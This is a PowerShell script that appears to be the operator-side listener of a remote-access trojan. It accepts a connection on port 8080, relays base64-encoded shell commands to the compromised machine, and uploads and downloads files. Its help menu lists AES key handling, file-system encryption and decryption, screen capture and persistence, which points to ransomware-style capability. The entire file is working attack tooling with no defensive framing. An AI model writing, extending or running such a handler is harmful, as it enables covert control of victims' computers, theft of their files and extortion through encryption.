
function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "[*] Connection from: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            while($true)
            {
                $transmitter           = New-Object System.IO.StreamWriter($stream)
                $receiver              = New-Object System.IO.StreamReader($stream)
                $plaintext_cmd         = Read-Host "[*]>>>"
                $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                $cmd                   = [Convert]::ToBase64String($cmd)

                if($cmd)
                {
                    if($plaintext_cmd | Select-String 'exit')
                    {
                        $transmitter.WriteLine($cmd)
                        $transmitter.Dispose()
                        $receiver.Dispose()
                        $client.Close()
                        exit
                    }
                    if($plaintext_cmd | Select-String 'send')
                    {
                       $transmission = '' 
                       $command     = $plaintext_cmd.Split(' ')[0] 
                       $filename    = $plaintext_cmd.Split(' ')[1] 
                       $filename    = Split-Path $filename -Leaf
                       $filecontent =  Get-Content $filename -Encoding Byte
                       $filecontent = [System.Convert]::ToBase64String($filecontent)
                       $transmission = "$command#$filename#$filecontent"
                       $transmitter.WriteLine($transmission)
                       $transmitter.Flush()
                       $plaintext_cmd         = Read-Host "[*]>>>"
                       $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                       $cmd                   = [Convert]::ToBase64String($cmd)
                    }
                    if($plaintext_cmd | Select-String 'download')
                    {
                        $command  = $plaintext_cmd.Split(' ')[0]
                        $filename = $plaintext_cmd.Split(' ')[1]
                        $transmission = "$command $filename" ; WRite-Host $transmission
                        $transmitter.WriteLine($transmission)
                        $transmitter.Flush()
                        Write-Host "[~] Awaiting download..."
                        $download = $receiver.ReadLine()
                        $content  = [System.Convert]::FromBase64String($download)
                        Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                        Write-Host "[*] Downloaded: $filename "
                        $plaintext_cmd = Read-Host "[*]>>>"
                        $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd           = [Convert]::ToBase64String($cmd)
                    }
                    if($plaintext_cmd | Select-String 'genkey')
                    {
                        $cmd = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd = [Convert]::ToBase64String($cmd)
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush()
                        $plaintext_cmd = Read-Host "[*]>>>"
                        $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd           = [Convert]::ToBase64String($cmd)
                    }
                    if(($plaintext_cmd | Select-String 'clear') -or ($plaintext_cmd | Select-String 'cls') -or ($plaintext_cmd | Select-String 'Clear-Host'))
                    {
                        try
                        {
                            Clear-Host
                        }
                        catch
                        {
                            continue
                        }
                    }
                    if(($plaintext_cmd | Select-String 'menu'))
                    {
                        $cmd = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                        $cmd = [Convert]::ToBase64String($cmd)
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush()

                        Write-Host "
                        [*] PowerShell - Handler - Help Menu
                        ------------------------------------
                        |              Options             |
                        ------------------------------------
                        1)  Transfer to host   - Syntax: 'send <filename>'     
                        2)  Download from host - Syntax: 'download <filename>'
                        3)  Generate AES Key   - Syntax: 'genkey'
                        4)  Transfer Key       - Syntax: 'retkey'
                        5)  Remove AES Key     - Syntax: 'remkey'
                        6)  Encryption         - Syntax: 'encryptfs'
                        7)  Decryption         - Syntax: 'decryptfs'
                        8)  ScreenShot         - Syntax: 'capture'
                        9)  Set Persistence    - Syntax: 'persist'
                        10) Invoke help        - Syntax: 'help'
                        11) Exit               - Syntax: 'exit' 
                        "
                    }
                    try
                    {
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush()
                    }
                    catch
                    {
                        continue
                    }
                }

                $intake      = $receiver.ReadLine()
                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                $response    = $intake

                if($intake)
                {
                    Write-Host $response
                }

            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080